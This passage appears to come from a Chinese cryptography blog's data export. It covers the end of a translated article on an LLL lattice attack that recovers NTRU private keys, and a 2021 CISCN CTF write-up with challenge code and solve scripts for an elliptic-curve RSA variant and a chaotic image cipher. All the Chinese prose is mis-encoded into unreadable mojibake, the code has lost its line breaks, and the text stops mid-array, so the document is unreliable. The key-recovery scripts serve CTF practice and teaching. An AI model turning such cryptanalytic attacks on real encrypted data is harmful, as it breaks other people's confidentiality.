171h3 = (171 * h)%q æˆ‘ä»¬å¯ä»¥æŠŠ$g$çœ‹æˆæ˜¯ç§é’¥$f$ä¹˜$h3$. è®°ä½, ç§é’¥$f$æ˜¯ä»$1,x,x^2,x^3,x^4,x^5,x^6$é€šè¿‡ä¸€äº›åŠ å‡å¾—åˆ°çš„. é‚£ä¹ˆ$g$å¯¹åº”çš„å°±æ˜¯ä»$h3,h3\\cdot x,h3\\cdot x^2,h3\\cdot x^3,h3\\cdot x^4,h3\\cdot x^5,h3\\cdot x^6$é€šè¿‡ä¸€äº›åŠ å‡å¾—åˆ°çš„.ä¸‹é¢æ˜¯è¿™äº›å¤šé¡¹å¼: 1234567891011121314h3# output: 58*x^6 + 210*x^5 + 54*x^4 + 36*x^3 + 194*x^2 + 130*x + 87convolution(h3,x)# output: 210*x^6 + 54*x^5 + 36*x^4 + 194*x^3 + 130*x^2 + 87*x + 58convolution(h3,x^2)# output: 54*x^6 + 36*x^5 + 194*x^4 + 130*x^3 + 87*x^2 + 58*x + 210convolution(h3,x^3)# output: 36*x^6 + 194*x^5 + 130*x^4 + 87*x^3 + 58*x^2 + 210*x + 54convolution(h3,x^4)# output: 194*x^6 + 130*x^5 + 87*x^4 + 58*x^3 + 210*x^2 + 54*x + 36convolution(h3,x^5)# output: 130*x^6 + 87*x^5 + 58*x^4 + 210*x^3 + 54*x^2 + 36*x + 194convolution(h3,x^6)# output: 87*x^6 + 58*x^5 + 210*x^4 + 54*x^3 + 36*x^2 + 194*x + 130 äº‹å®ä¸Š, $g = f\\cdot h3 \\mod q$, $q$ å¯ä»¥ä»ä»»æ„çš„å‚æ•°é€šè¿‡åŠ å‡å¾—åˆ°. è¿™æ„å‘³ç€$g$å¯ä»¥ä»$q,q\\cdot x,q\\cdot x^2,q\\cdot x^3,q\\cdot x^4,q\\cdot x^5,q\\cdot x^6,h3,h3\\cdot x,h3\\cdot x^2,h3\\cdot x^3,h3\\cdot x^4,h3\\cdot x^5,h3\\cdot x^6$ç»„åˆè€Œæ¥ æœ€å, è¿æ¥ä¸Šé¢çš„è¿™äº›ç³»æ•°å¹¶å°†äº§ç”Ÿçš„ç»„åˆå†™è¿›ä¸‹é¢çš„çŸ©é˜µä¸­ 123456789101112131415161718192021M = Matrix(2*n)for i in range(n): M[i,i] = qfor i in range(n,2*n): M[i,i] = 1for i in range(n): for j in range(n): M[i+n,j] = convolution(h3, x^i)[j]M# output: [256 0 0 0 0 0 0 0 0 0 0 0 0 0]# output: [ 0 256 0 0 0 0 0 0 0 0 0 0 0 0]# output: [ 0 0 256 0 0 0 0 0 0 0 0 0 0 0]# output: [ 0 0 0 256 0 0 0 0 0 0 0 0 0 0]# output: [ 0 0 0 0 256 0 0 0 0 0 0 0 0 0]# output: [ 0 0 0 0 0 256 0 0 0 0 0 0 0 0]# output: [ 0 0 0 0 0 0 256 0 0 0 0 0 0 0]# output: [ 87 130 194 36 54 210 58 1 0 0 0 0 0 0]# output: [ 58 87 130 194 36 54 210 0 1 0 0 0 0 0]# output: [210 58 87 130 194 36 54 0 0 1 0 0 0 0]# output: [ 54 210 58 87 130 194 36 0 0 0 1 0 0 0]# output: [ 36 54 210 58 87 130 194 0 0 0 0 1 0 0]# output: [194 36 54 210 58 87 130 0 0 0 0 0 1 0]# output: [130 194 36 54 210 58 87 0 0 0 0 0 0 1] ç„¶åä½¿ç”¨LLLç®—æ³•å¯ä»¥å¿«é€Ÿçš„æ‰¾å‡ºè¡Œç»„åˆå‡ºæ¥çš„çŸ­å‘é‡. 123456789101112131415M.LLL()# output: [ -1 -1 1 -1 1 0 0 -1 1 -1 -1 1 0 0]# output: [ 0 -1 -1 1 -1 1 0 0 -1 1 -1 -1 1 0]# output: [ 1 -1 1 -1 0 0 1 -1 1 1 -1 0 0 1]# output: [ -1 1 -1 0 0 1 1 1 1 -1 0 0 1 -1]# output: [ 1 -1 0 0 1 1 -1 1 -1 0 0 1 -1 1]# output: [ 1 1 1 1 1 1 1 1 1 1 1 1 1 1]# output: [ 0 0 1 1 -1 1 -1 0 0 1 -1 1 1 -1]# output: [ 39 -28 19 12 11 -48 -4 47 6 -31 -20 -19 36 -18]# output: [ -5 -34 -14 -3 9 -39 -43 47 54 22 1 -17 19 1]# output: [ 4 -39 28 -19 -12 -11 48 18 -47 -6 31 20 19 -36]# output: [ 9 -40 -43 -5 -32 -13 -1 -17 20 1 47 54 23 3]# output: [ -1 9 -40 -43 -5 -32 -13 3 -17 20 1 47 54 23]# output: [ 14 3 -9 40 43 4 32 -22 -3 17 -18 -1 -48 -54]# output: [ 28 -19 -12 -11 48 4 -39 -6 31 20 19 -36 18 -47] è¿™é‡Œè¯¦ç»†çš„è§£é‡Šä¸€ä¸‹, å› ä¸ºå¤šé¡¹å¼gçš„ç³»æ•°å°±æ˜¯ç”±$q,q\\cdot x,q\\cdot x^2,q\\cdot x^3,q\\cdot x^4,q\\cdot x^5,q\\cdot x^6,h3,h3\\cdot x,h3\\cdot x^2,h3\\cdot x^3,h3\\cdot x^4,h3\\cdot x^5,h3\\cdot x^6$è¿™äº›é¡¹çš„ç³»æ•°çº¿æ€§ç»„åˆè€Œæ¥çš„, çŸ©é˜µMå·¦ä¸‹è§’é‚£ä¸€å—å°±æ˜¯h3å¯èƒ½å‡ºç°çš„ç³»æ•°çš„æ’åˆ—, å·¦ä¸Šè§’ä¸€å—æ˜¯qå’Œ$x^n$ç›¸ä¹˜çš„ç³»æ•°(å…¶å®å°±æ˜¯q), è¿™äº›è¡Œå‘é‡è¿›è¡Œçº¿æ€§ç»„åˆçš„ç»“æœä¸­, è‚¯å®šå­˜åœ¨$g$çš„ç³»æ•°, è€Œåˆå› ä¸º$g$çš„ç³»æ•°éƒ½æ˜¯å¾ˆå°çš„$\\{1,0,-1\\}$, æ‰€ä»¥åˆ©ç”¨æ ¼åŸºè§„çº¦, å¯ä»¥æŠŠå‘é‡$g$è§„çº¦å‡ºæ¥. ç¬¬ä¸€è¡Œçš„å°±æ˜¯$f$å¯¹åº”çš„$g$, äº‹å®ä¸Š, å¦‚æœ$f$çš„è´Ÿæ•°é‚£ä¹ˆäº§ç”Ÿçš„ä¹Ÿæ˜¯$g$çš„è´Ÿæ•° 123456M.LLL()[0][n:]# output: (-1, 1, -1, -1, 1, 0, 0)Zx(list(_))# output: x^4 - x^3 - x^2 + x - 1f# output: -x^4 + x^3 + x^2 - x + 1 ä½†æ˜¯æ”»å‡»è€…ä»ç„¶å¯ä»¥è§£å¯†ä¸”ä¸è€ƒè™‘è´Ÿæ•°. åŒæ ·çš„, LLL å¯ä»¥äº§ç”Ÿèƒ½å¤Ÿæ­£å¸¸ç”¨äºè§£å¯†çš„$x \\cdot f$å’Œ$x \\cdot g$, æ‰€ä»¥å¯¹äºNTRUæ–¹æ¡ˆ, éœ€è¦æ›´å¤§çš„å‚æ•°$n$æ¥ä¿è¯å®ƒçš„å®‰å…¨æ€§. è‡ªåŠ¨åŒ–æ”»å‡»1234567891011121314151617181920212223242526272829303132333435def attack(publickey): recip3 = lift(1/Integers(q)(3)) publickeyover3 = balancedmod(recip3 * publickey,q) M = matrix(2 * n) for i in range(n): M[i,i] = q for i in range(n): M[i+n,i+n] = 1 c = convolution(x^i,publickeyover3) for j in range(n): M[i+n,j] = c[j] M = M.LLL() for j in range(2 * n): try: f = Zx(list(M[j][n:])) f3 = invertmodprime(f,3) return (f,f3) except: pass return (f,f)n = 120q = 2^32d = 81publickey,secretkey = keypair()donald = attack(publickey)print donald[0]try: m = randommessage() c = encrypt(m,publickey) assert decrypt(c,donald) == m print 'attack successfully decrypts'except: print 'attack was unsuccessful' è¿™ä¸ªè„šæœ¬ç”¨çš„æ˜¯Python2çš„sage? çœŸçš„è¦ç”¨æ¥è§£é¢˜ä¼°è®¡è¿˜å¾—è‡ªå·±å†™ä¸€ä¸ª","link":"/2021/03/28/Translation-of-LatticeHacks/"},{"title":"writeup-for-2021-CISCN","text":"å›½èµ›åˆèµ›, ç¬¬ä¸€æ¬¡å‚åŠ å›½èµ›, é™¤äº†ç¬¬ä¸€é“æ¶å¿ƒçš„å¤å…¸, å…¶ä»–é¢˜ç›®è¿˜æ˜¯åšçš„æŒºæœ‰æ„æ€çš„ä¸€å…±å…­é“é¢˜, å‡ºäº†å››é“é¢˜, å‰©ä¸‹ä¸€é“å¤å…¸(å‘•äº†), ä¸€é“AESè¿˜å¯ä»¥å§, è®°å½•ä¸€ä¸‹, è™½ç„¶æœ‰äº›éƒ¨åˆ†ä»¥å‰åšè¿‡, ä½†è¿˜æ˜¯å­¦åˆ°äº†æ–°ä¸œè¥¿çš„ 0x00 classic æ»šäº†, ç­‰çœŸå¯†ç ğŸ‘´ğŸ‘´çš„wp, 2021 / 5 /18 çœ‹äº†åˆ«çš„çˆ·çˆ·åšå®¢, å¥½å®¶ä¼™å¥—å¨ƒçˆ†ç ´ ADFGX + å‡¯æ’’ +æ …æ (è¯è¯´æ˜¯ADFGXè¿™ä¸ªé¡ºåºå—) 0x01 moveproblem123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172from Crypto.Util.number import *from math import sqrt, gcdimport randomBITS = 512f = open(&quot;flag.txt&quot;, &quot;rb&quot;)flag = f.read()f.close()def get_prime(nbit): while True: p = getPrime(nbit) if p % 3 == 2: return pdef gen(nbit): p = get_prime(nbit) q = get_prime(nbit) if q &gt; p: p, q = q, p n = p * q bound = int(sqrt(2 * n)) // 12 while True: x = random.randint(1, round(sqrt(bound))) y = random.randint(1, bound) // x zbound = int(((p - q) * round(n ** 0.25) * y) // (3 * (p + q))) z = zbound - ((p + 1) * (q + 1) * y + zbound) % x e = ((p + 1) * (q + 1) * y + z) // x if gcd(e, (p + 1) * (q + 1)) == 1: break gifts = [int(bin(p)[2:][:22], 2), int(bin(p)[2:][256:276], 2)] return n, e, giftsdef add(p1, p2): if p1 == (0, 0): return p2 if p2 == (0, 0): return p1 if p1[0] == p2[0] and (p1[1] != p2[1] or p1[1] == 0): return (0, 0) if p1[0] == p2[0]: tmp = (3 * p1[0] * p1[0]) * inverse(2 * p1[1], n) % n else: tmp = (p2[1] - p1[1]) * inverse(p2[0] - p1[0], n) % n x = (tmp * tmp - p1[0] - p2[0]) % n y = (tmp * (p1[0] - x) - p1[1]) % n return (int(x), int(y))def mul(n, p): r = (0, 0) tmp = p while 0 &lt; n: if n &amp; 1 == 1: r = add(r, tmp) n, tmp = n &gt;&gt; 1, add(tmp, tmp) return rn, e, hint = gen(BITS)pt = (bytes_to_long(flag[:len(flag) // 2]), bytes_to_long(flag[len(flag) // 2:]))c = mul(e, pt)f = open(&quot;output.txt&quot;, &quot;w&quot;)f.write(f&quot;n = {n}\\n&quot;)f.write(f&quot;e = {e}\\n&quot;)f.write(f&quot;h1 = {hint[0]}\\n&quot;)f.write(f&quot;h2 = {hint[1]}\\n&quot;)f.write(f&quot;c = {c}\\n&quot;)f.close() analyseså•Šè¿™ï¼Œçœ‹åˆ°é¢˜ç›®é©¬ä¸Šå°±æƒ³èµ·åˆšç»“æŸä¸ä¹…çš„è™ç¬¦çš„simultaneousäº†ï¼Œå½“æ—¶é‚£é¢˜æ²¡è§£å‡ºæ¥æ¼ç«äº†å¥½ä¹…ã€‚è¿˜å¥½é‚£ä¸ªæ—¶å€™å†™wpå†™çš„å¤Ÿè¯¦ç»†äº†ï¼Œå›å»å†çœ‹ä¸€éåˆä»¿ä½›æ˜ç™½äº†ä¸€åˆ‡hhh ä¼ é€é—¨-&gt; è·Ÿç€è™ç¬¦é‚£æ ·å°±èƒ½åˆ†è§£$n$äº†ï¼Œå¾—åˆ°äº†$pï¼Œq$ä¹‹åï¼Œå†çœ‹çœ‹åé¢çš„åŠ å¯† çœ‹åˆ°add() mul(), ECCæ²¡é”™äº†ï¼Œå¸å–ä»¥å‰çš„æ•™è®­ï¼ŒåšECCå…ˆçœ‹å…³ç³»å¼æ˜¯æ€æ ·çš„ï¼Œä»åŠ æ³•çš„é‚£å‡ è¡Œå¯ä»¥çœ‹å‡ºï¼Œè¿™é‡Œç”¨çš„æ¤­åœ†æ›²çº¿å°±æ˜¯å¸¸ç”¨çš„é‚£ç§ï¼Œè€Œä¸”$a = 0$ï¼Œ æœ‰ä¸€ä¸ªç‚¹$E(c)$å¾ˆå®¹æ˜“å°±èƒ½ç®—å‡ºå‚æ•°$b$ é€šè¿‡åˆ†è§£å‡ºçš„$p$ï¼Œæˆ‘ä»¬å°±èƒ½é€ å‡ºæ›²çº¿$y^2 = x^3 + b \\mod p$, é˜¶ä¸º$p + 1$ï¼Œæ¤­åœ†æ›²çº¿çš„ä¹˜æ³•å°±æ˜¯ä¸€ä¸ªç¯ï¼Œä¹˜å®Œä¸€ä¸ªé˜¶å°±è½¬å›æ¥äº†ï¼Œæ‰€ä»¥åªéœ€è¦æ±‚$d = e^{-1} \\mod p+1$ å°±å¯ä»¥æœ‰$e \\cdot d \\cdot E(flag) = E(flag) $ æœ€åæŠŠç‚¹è½¬å›æ¥å°±å®Œäº‹äº† exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677n = 80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281e = 67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809c = (6785035174838834841914183175930647480879288136014127270387869708755060512201304812721289604897359441373759673837533885681257952731178067761309151636485456082277426056629351492198510336245951408977207910307892423796711701271285060489337800033465030600312615976587155922834617686938658973507383512257481837605, 38233052047321946362283579951524857528047793820071079629483638995357740390030253046483152584725740787856777849310333417930989050087087487329435299064039690255526263003473139694460808679743076963542716855777569123353687450350073011620347635639646034793626760244748027610309830233139635078417444771674354527028)from Crypto.Util.number import long_to_bytesfrom gmpy2 import is_primedef find_p_puls_q(f,k): s = 0 b = k for i in range(2000): a = (s+b) // 2 if f.subs(x==a) &gt; 0: s = a else: b = a return adef find_p(pq,n): p = var('p') if pq^2 - 4*n&lt;0: return [] f = p^2 - pq*p+n r = f.roots() res = [] for i in r: if i[0]&gt;0: res.append(int(i[0])) return (res[0],res[1])def add(p1, p2): if p1 == (0, 0): return p2 if p2 == (0, 0): return p1 if p1[0] == p2[0] and (p1[1] != p2[1] or p1[1] == 0): return (0, 0) if p1[0] == p2[0]: tmp = (3 * p1[0] * p1[0]) * int(inverse_mod(2 * p1[1], n)) % n else: tmp = (p2[1] - p1[1]) * int(inverse_mod(p2[0] - p1[0], n) )% n x = (tmp * tmp - p1[0] - p2[0]) % n y = (tmp * (p1[0] - x) - p1[1]) % n return (int(x), int(y))def mul(n, p): r = (0, 0) tmp = p while 0 &lt; n: if n &amp; 1 == 1: r = add(r, tmp) n, tmp = n &gt;&gt; 1, add(tmp, tmp) return rsn = round(sqrt(n))L = [[sn,e],[0,-n]]L = matrix(L)R = L.LLL()[0]x = abs(R[0]) // sns = abs(R[1])A = round(n ^ 0.25)^2y = (e * x - s )//nkk = (e * x - y * n ) // yx = var('x')f =(3*(kk-1)*x-3*x^2)^2 - A*(x^2-4*n)ppq = find_p_puls_q(f,kk)p,q =find_p(ppq+1,n)b = - ( c[0] ** 3 - c[1]**2) % pE = EllipticCurve(GF(p), [0, 0, 0, 0, b])P = E(c)o = P.order()d = inverse_mod(e,o)m = d * E(c)print(long_to_bytes(m[0])+long_to_bytes(m[1])) 0x02 imageencryptproblem12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import randomfrom flag import flag,image,r,key1,key2import md5assert(flag[:5]=='CISCN')assert(len(str(r))==3)data = ''.join(map(chr,image))assert(flag[6:-1] == md5.new(data).hexdigest())assert(key1&lt;256)assert(key2&lt;256)x0 = random.random()x0 = round(x0,6)def generate(x): return round(r*x*(3-x),6)def encrypt(pixel,key1,key2,x0,m,n): num = m*n/8 seqs = [] x = x0 bins = '' tmp = [] for i in range(num): x = generate(x) tmp.append(x) seqs.append(int(x*22000)) for x in seqs: bin_x = bin(x)[2:] if len(bin_x) &lt; 16: bin_x = '0'*(16-len(bin_x))+bin_x bins += bin_x assert(len(pixel) == m*n) cipher = [ 0 for i in range(m) for j in range(n)] for i in range(m): for j in range(n): index = n*i+j ch = int(bins[2*index:2*index+2],2) pix = pixel[index] if ch == 0: pix = (pix^key1)&amp;0xff if ch == 1: pix = (~pix^key1)&amp;0xff if ch == 2: pix = (pix^key2)&amp;0xff if ch == 3: pix = (~pix^key2)&amp;0xff cipher[index] = pix return cipherflagimage = imagetestimage = []for i in range(16*16): testimage.append(random.randint(0,255))print testimageprint encrypt(testimage,key1,key2,x0,16,16)print encrypt(flagimage,key1,key2,x0,24,16) analysesè¿™é¢˜åšçš„æ—¶å€™æ²¡å¥½å¥½åˆ†æï¼Œæœ‰äº›ç»“æœæ²¡è¿½ç©¶åˆ°åº•æ˜¯ä¸ºå•¥ï¼Œæ‹¿åˆ°äº†å°±å¼€å§‹çˆ†ç ´äº†ï¼Œç°åœ¨å¥½å¥½åˆ†æä¸€ä¸‹ã€‚ è¿™é‡Œæ¨¡æ‹Ÿäº†ä¸€ä¸ªå›¾ç‰‡çš„åŠ å¯†ï¼ŒåŠ å¯†ä¼šæœ‰ä¸€ä¸ªèŒƒå›´åœ¨$[0,1)$çš„å…­ä½å°æ•°åˆå§‹å€¼$x0$ï¼Œä»¥åŠä¸€ä¸ªå’±ä»¬ä¸çŸ¥é“çš„å‚æ•°$r$ï¼Œä½†æ˜¯è¿™ä¸ªå‚æ•°æœ‰ä¸€ä¸ªhintï¼Œlen(str(r)) == 3ï¼Œä¸è¿‡è¿™ä¸ªhintä¸€å¼€å§‹è¯¯å¯¼æˆ‘äº†ã€‚ã€‚ã€‚ å…ˆæ¥çœ‹çœ‹å…·ä½“çš„åŠ å¯†è¿‡ç¨‹ã€‚åŠ å¯†å¤§æ¦‚å¯ä»¥åˆ†ä¸ºä¸¤ä¸ªè¿‡ç¨‹ bitstreamç”Ÿæˆ æ ¹æ®bitstream key1 key2å¯¹å›¾ç‰‡è¿›è¡ŒåŠ å¯† bitstreamç”Ÿæˆbitstreamçš„ç”Ÿæˆè·Ÿä¸¤ä¸ªå˜é‡æœ‰å…³$x0,r$ï¼Œç¡®å®šçš„è¿™ä¸¤ä¸ªå‚æ•°é‚£ä¹ˆç”Ÿæˆçš„bitstreamå°†ä¼šä¸€æ¨¡ä¸€æ ·ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®ç”Ÿæˆbitstreamçš„å‡½æ•°å†™å‡ºè¿™ä¸¤ä¸ªå˜é‡çš„ä¸€ä¸ªå…³ç³»$$x_{n+1} \\approx r \\cdot x_n (3 - x_n) \\\\r \\approx {x_{n+1} \\over x_n(3-x_n)} \\tag 1$$ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªéœ€è¦ç¡®å®šä¸¤ä¸ª$x$å°±èƒ½å¤§æ¦‚çš„ç®—å‡º$r$äº†ï¼Œå…ˆè®°ä¸º$(1)$ï¼Œåé¢æœ‰ç”¨ è€Œbitstreamæ˜¯æ ¹æ®ç”Ÿæˆçš„åºåˆ—$x_1,x_2,â€¦x_n$æ¥ç”Ÿæˆçš„ï¼Œå…·ä½“æ˜¯è¿™æ ·$$bin(x_1) | bin(x_2)|â€¦|bin(x_n)$$è¿™é‡Œçš„$|$æ˜¯æ‹¼æ¥ï¼Œè€Œä¸”$bin(x_i)$åœ¨é•¿åº¦ä¸å¤Ÿ16çš„æ—¶å€™ä¼šåœ¨å‰é¢å¡«å……0åˆ°é•¿åº¦ä¸º16 åŠ å¯†æˆ‘ä»¬æŠŠbitstreamæ¯ä¸¤ä½çœ‹æˆä¸€ä¸ª$X$ï¼Œä¹Ÿå°±æ˜¯è¯´æ¯”ç‰¹æµæ˜¯è¿™æ ·çš„-&gt;$X_1,X_2,â€¦X_n$ï¼Œæ˜¾ç„¶$X$çš„èŒƒå›´æ˜¯$[0,3]$ å†è¯´åŠ å¯†è¿‡ç¨‹ä¹‹å‰ï¼Œå¾—å…ˆäº†è§£ä¸€ä¸ªå°çŸ¥è¯†(~a ^ a )ä¼šæŠŠ$a$çš„æ‰€æœ‰ä½éƒ½ç½®ä¸º1 å¥½äº†ï¼Œç°åœ¨æ¥çœ‹æ•´ä¸ªåŠ å¯†è¿‡ç¨‹ è¿™é‡Œçš„å›¾ç‰‡å…¶å®å°±æ˜¯ä¸€ä¸ªèŒƒå›´åœ¨$[0,256]$çš„æ•°çš„åºåˆ—$m_1,m_2,m_3,â€¦,m_n$ ä¸€å—å…¬å¼ç›´æ¥æå®šåŠ å¯†ï¼(å…¬å¼é‡Œçš„-méƒ½æ˜¯mçš„åç çš„æ„æ€)$$m_i =\\begin{cases}m_i \\oplus key_1 , X_i =0 \\\\-m_i \\oplus key_1, X_i = 1 \\\\m_i \\oplus key_2, X_i = 2 \\\\-m_i \\oplus key_2, X_i = 3\\end{cases}$$æ‰€ä»¥æ•´ä¸ªåŠ å¯†å°±æ˜¯ç”±bitstreamæ¥å†³å®šä½¿ç”¨å“ªä¸ªå¯†é’¥å’Œæ“ä½œ é¢˜ç›®ç»™äº†ä¸‰ä¸ªå›¾ç‰‡æ•°æ®$M_1,C_1,C_2$ï¼Œè¦æ±‚$M_2$ è¿™é‡Œæˆ‘ä»¬è®¡ç®—$M_1 \\oplus C_1$ï¼Œå¦‚æœæ˜¯ä¸å–åçš„æ“ä½œï¼Œé‚£ä¹ˆå¼‚æˆ–å‡ºæ¥çš„å°±æ˜¯keyï¼Œ$m_i \\oplus key \\oplus m_i = key$ å¦‚æœæ˜¯è¿›è¡Œäº†å–åæ“ä½œçš„ï¼Œé‚£ä¹ˆå¼‚æˆ–å‡ºæ¥çš„å°±æ˜¯keyçš„åç ï¼Œ$-m_i \\oplus m_i \\oplus key = -key $ æ‰€ä»¥æœ€åæ•´ä¸ªå›¾ç‰‡å¼‚æˆ–ä¸‹æ¥ï¼Œå‡ºç°çš„æ•°æ®åªä¼šæœ‰å››ä¸ªæ•°å­— 1[78, 177, 78, 177, 169, 78, 86, 86, 78, 177, 78, 169, 78, 78, 78, 177, 78, 177, 177, 169, 78, 86, 177, 169, 78, 177, 86, 78, 86, 169, 169, 169, 177, 169, 169, 169, 86, 169, 78, 78, 78, 78, 177, 177, 177, 78, 177, 78, 177, 169, 78, 86, 169, 78, 86, 177, 78, 86, 177, 177, 169, 78, 86, 169, 177, 86, 78, 177, 86, 169, 169, 177, 86, 177, 86, 78, 169, 169, 86, 86, 177, 78, 86, 78, 86, 78, 169, 169, 86, 86, 78, 169, 86, 169, 169, 86, 177, 86, 169, 169, 177, 177, 86, 86, 78, 169, 177, 78, 78, 169, 177, 169, 177, 78, 86, 86, 86, 78, 177, 78, 86, 86, 78, 78, 177, 78, 177, 169, 177, 86, 169, 177, 177, 78, 169, 78, 78, 169, 86, 177, 177, 78, 169, 78, 177, 78, 86, 177, 86, 86, 78, 86, 86, 86, 86, 86, 86, 177, 78, 177, 177, 169, 177, 86, 78, 177, 169, 177, 78, 86, 86, 86, 78, 78, 177, 86, 177, 78, 169, 78, 169, 169, 169, 86, 86, 78, 86, 169, 86, 78, 169, 169, 177, 86, 177, 169, 78, 78, 78, 78, 86, 177, 169, 78, 86, 177, 86, 78, 177, 78, 86, 86, 169, 86, 177, 78, 86, 86, 78, 177, 177, 169, 177, 86, 177, 86, 86, 169, 177, 169, 177, 78, 78, 169, 86, 86, 78, 177, 177, 169, 177, 78, 86, 177, 78, 177, 86, 169, 86, 86, 86, 169, 86, 177, 86, 177] [169,177,86,78]ï¼Œè€Œ169å¯¹åº”çš„åç æ˜¯86ï¼Œ177å¯¹åº”78 ç°åœ¨é—®é¢˜æ¥äº†ï¼Œæœ‰äº†è¿™ä¸ªèƒ½å¹²å˜› èƒ½å¦é€šè¿‡è¿™å››ä¸ªæ•°å­—è¿˜åŸå›bitstreamå‘¢ï¼Œæˆ‘ä»¬çŸ¥é“bitstreamæ˜¯å†³å®šä½¿ç”¨å“ªä¸ªå¯†é’¥çš„ï¼Œè€Œå¯†é’¥çš„ä½¿ç”¨é¡ºåºæˆ‘ä»¬æ˜¯çŸ¥é“çš„(æˆ‘ä»¬åªæ˜¯ä¸çŸ¥é“å“ªä¸ªæ˜¯key1 å“ªä¸ªæ˜¯key2)ï¼Œæˆ‘ä»¬å¯ä»¥ä¸€ä¸€å‡è®¾ä¸€ä¸‹ï¼Œä¹Ÿå°±8ç§ç»„åˆ key1 key2 ~key1 ~key2 86 78 169 177 86 177 169 78 169 177 86 78 169 78 86 177 78 169 177 86 78 86 177 169 177 86 78 169 177 169 78 86 Xi 00 10 01 11 æ¯ç§ç»„åˆä¸­ï¼Œæ¯ä¸ªæ•°å­—éƒ½å¯¹åº”ä¸€ä¸ª$X_i$ï¼Œæˆ‘ä»¬å°±èƒ½åˆ©ç”¨æ•°å­—çš„é¡ºåºï¼Œè¿˜åŸå‡ºè¿™ç§ç»„åˆä¸‹æ‰€ç”¨çš„bitstreamï¼Œä¹Ÿå°±æ˜¯è¿˜åŸå‡º$$\\hat X_1 , \\hat X_2 , â€¦ ,\\hat X_i$$è¿™é‡Œç”¨$\\hat X$è€Œä¸æ˜¯$X$å°±æ˜¯å› ä¸ºè¿˜åŸå‡ºçš„ä¸ä¸€å®šæ˜¯å¯¹çš„ï¼Œåªæœ‰ä¸Šé¢çš„8ç§æƒ…å†µä¸­çš„1ç§æ‰æœ‰å¯èƒ½å¯¹ å› ä¸º$X \\approx 22000 \\cdot x$ä¸Šé¢çš„$(1)$$$r \\approx {x_{n+1} \\over x_n(3-x_n)} \\approx {X_{n+1} \\over X_n(3 - X_n) }\\cdot {1 \\over 22000}$$éšä¾¿æ‰¾äº†å‡ ä¸ªç»„åˆè¯•äº†ä¸‹ç®—$r$ï¼Œå‘ç°éƒ½åœ¨$[0,2]$ä¸­ï¼Œå†æ ¹æ®æç¤ºlen(r) == 3ï¼Œ$r$åº”è¯¥æ˜¯ä¸ªä¸€ä½å°æ•°ï¼Œæ¯”å¦‚$0.5,1.3$è¿™ç§ï¼ˆä¸€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯3ä½æ•°ï¼Œå‡ ç™¾çš„é‚£ç§ï¼Œè®©æˆ‘æ‡µäº†å¥½ä¹…è‰¹ ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç¡®å®šä¸€ç§ç»„åˆï¼Œæ¥ç¡®å®šå¯¹åº”çš„$r$å’Œ$bitstream$ï¼Œä½†æ˜¯åŠ å¯†$M_2$ç”¨çš„bitstreamæ¯”åŠ å¯†$M_1$çš„é•¿ï¼Œæ‰€ä»¥æƒ³ç»§ç»­å¾€ä¸‹ç®—bitstreamï¼Œæˆ‘ä»¬è¿˜éœ€è¦$x0$ å‰é¢æˆ‘ä»¬çŸ¥é“ï¼Œ$x0$æ˜¯å…­ä½çš„å°äº1çš„å°æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€å…±ä¹Ÿå°±$1000000$ç§å¯èƒ½ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨çŒœçš„$x0$å’Œç®—å‡ºæ¥çš„$r$æ¥ç”Ÿæˆbitstreamï¼Œçœ‹å¾—åˆ°çš„bitstreamå’Œæˆ‘ä»¬ç®—$r$çš„bitstreamæ˜¯å¦ç›¸ç­‰æ¥çˆ†ç ´$x0$ï¼Œ8ç§ç»„åˆè¯•å®Œä¹Ÿå°±$8000000$ï¼Œååˆ†é’Ÿä¸åˆ°å°±èƒ½è§£å†³ã€‚ çˆ†ç ´å‡º$x0$ï¼Œæ‰€æœ‰å‚æ•°éƒ½å¯ä»¥å¯¹åº”çš„ç¡®å®šä¸‹æ¥äº†ã€‚ å‰©ä¸‹çš„å°±æ˜¯é‡æ–°ç®—ä¸€æ¬¡bitstreamï¼Œç›´åˆ°é•¿åº¦å¤Ÿç”¨æ¥è§£å¯†$C_2$ï¼Œè§£å¯†å°±å®Œäº‹äº† exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159# python2import randomimport md5from time import timem1 = [ 205, 237, 6, 158, 24, 119, 213, 32, 74, 151, 142, 186, 57, 28, 113, 62, 165, 20, 190, 37, 159, 137, 196, 44, 97, 37, 7, 222, 220, 95, 4, 66, 0, 28, 199, 142, 95, 105, 119, 232, 250, 215, 60, 162, 91, 211, 63, 30, 91, 108, 217, 206, 80, 193, 230, 42, 221, 71, 136, 115, 22, 176, 91, 57, 61, 3, 87, 73, 250, 121, 51, 72, 83, 120, 77, 199, 236, 190, 249, 116, 45, 6, 134, 110, 149, 94, 214, 232, 153, 213, 119, 98, 81, 203, 240, 114, 240, 29, 122, 188, 156, 53, 128, 185, 40, 147, 245, 204, 47, 101, 80, 229, 41, 150, 28, 195, 25, 235, 119, 6, 192, 8, 73, 255, 159, 172, 77, 94, 254, 104, 236, 219, 141, 91, 195, 162, 97, 56, 252, 173, 163, 43, 167, 214, 50, 73, 115, 190, 254, 53, 61, 77, 138, 192, 15, 4, 190, 27, 37, 108, 101, 135, 90, 215, 106, 243, 112, 111, 106, 89, 143, 150, 185, 142, 192, 176, 48, 138, 164, 185, 61, 77, 72, 0, 17, 203, 210, 71, 186, 49, 162, 250, 218, 219, 195, 63, 248, 220, 155, 180, 219, 132, 219, 94, 144, 247, 211, 95, 70, 227, 222, 